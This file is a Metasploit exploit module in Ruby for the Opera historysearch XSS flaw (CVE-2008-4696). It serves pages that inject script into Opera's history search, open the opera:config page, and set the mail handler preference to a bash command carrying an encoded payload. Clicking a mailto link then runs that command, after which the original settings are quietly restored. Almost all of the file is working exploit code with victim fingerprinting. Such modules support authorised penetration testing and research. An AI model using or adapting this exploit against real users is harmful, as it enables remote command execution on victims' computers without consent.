##
# $Id: opera_historysearch.rb 10998 2010-11-11 22:43:22Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::HttpServer::HTML

	include Msf::Exploit::Remote::BrowserAutopwn
	autopwn_info({
		:ua_name    => HttpClients::OPERA,
		:javascript => true,
		:rank       => ExcellentRanking, # reliable command execution
		:vuln_test  => %Q{
			v = parseFloat(opera.version());
			if (9.5 < v && 9.62 > v) {
				is_vuln = true;
			}
		},
	})

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Opera historysearch XSS',
			'Description'    => %q{
					Certain constructs are not escaped correctly by Opera's History
				Search results.  These can be used to inject scripts into the
				page, which can then be used to modify configuration settings
				and execute arbitrary commands.  Affects Opera versions between
				9.50 and 9.61.
			},
			'License'        => BSD_LICENSE,
			'Author'         =>
				[
					'Roberto Suggi', # Discovered the vulnerability
					'Aviv Raff <avivra [at] gmail.com>', # showed it to be exploitable for code exec
					'egypt',  # msf module
				],
			'Version'        => '$Revision: 10998 $',
			'References'     =>
				[
					['CVE',    '2008-4696'],
					['OSVDB',  '49472'],
					['BID',    '31869'],
					['URL',    'http://www.opera.com/support/kb/view/903/'],
				],
			'Payload'        =>
				{
					'ExitFunc' => 'process',
					'Space'    => 4000,
					'DisableNops' => true,
					'BadChars' => "\x09\x0a\x0d\x20",
					'Compat'      =>
						{
							'PayloadType' => 'cmd',
							'RequiredCmd' => 'generic perl ruby telnet',
						}
				},
			'Targets'        =>
				[
					#[ 'Automatic', {  } ],
					#[ 'Opera < 9.61 Windows',
					#	{
					#		'Platform' => 'win',
					#		'Arch' => ARCH_X86,
					#	}
					#],
					[ 'Opera < 9.61 Unix Cmd',
						{
							'Platform' => 'unix',
							'Arch' => ARCH_CMD,
						}
					],
				],
			'DisclosureDate' => 'Oct 23 2008', # Date of full-disclosure post showing code exec
			'DefaultTarget'  => 0
			))
	end

	def on_request_uri(cli, request)

		headers = {}
		html_hdr = %Q^
			<html>
			<head>
			<title>Loading</title>
			^
		html_ftr = %Q^
			</head>
			<body >
			<h1>Loading</h1>
			</body></html>
			^

		case request.uri
		when /[?]jspayload/
			p = regenerate_payload(cli)
			if (p.nil?)
				send_not_found(cli)
				return
			end
			# We're going to run this through unescape(), so make sure
			# everything is encoded
			penc = Rex::Text.to_hex(p.encoded, "%")
			content =
				%Q{
					var s = document.createElement("iframe");

					s.src="opera:config";
					s.id="config_window";
					document.body.appendChild(s);
					config_window.eval(
						"var cmd = unescape('/bin/bash -c %22#{penc}%22 ');" +
						"old_app = opera.getPreference('Mail','External Application');" +
						"old_handler = opera.getPreference('Mail','Handler');" +
						"opera.setPreference('Mail','External Application',cmd);" +
						"opera.setPreference('Mail','Handler','2');" +
						"app_link = document.createElement('a');" +
						"app_link.setAttribute('href', 'mailto:a@b.com');" +
						"app_link.click();" +
						"setTimeout(function () {opera.setPreference('Mail','External Application',old_app)},0);" +
						"setTimeout(function () {opera.setPreference('Mail','Handler',old_handler)},0);" +
					"");
					setTimeout(function () {window.location='about:blank'},1);
				}

		when /[?]history/
			js = %Q^
				window.onload = function() {
					location.href = "opera:historysearch?q=*";
				}
				^
			content = %Q^
				#{html_hdr}
				<script><!--
				#{js}
				//--></script>
				#{html_ftr}
				^
		when get_resource()
			print_status("Sending #{self.name} to #{cli.peerhost} for request #{request.uri}")

			js = %Q^
				if (window.opera) {
					var wnd = window;
					while (wnd.parent != wnd) {
						wnd = wnd.parent;
					}
					url = location.href;
					wnd.location = url + "?history#<script src='" + url +"?" + "jspayload=1'/><!--";
				}
				^
			content = %Q^
				#{html_hdr}
				<script><!--
				#{js}
				//--></script>
				#{html_ftr}
				^
		else
			print_status("Sending 404 to #{cli.peerhost} for request #{request.uri}")
			send_not_found(cli)
			return
		end
		content.gsub!(/^\t{4}/, '')
		content.gsub!(/\t/, ' ')

		send_response_html(cli, content, headers)
		handler(cli)
	end

end
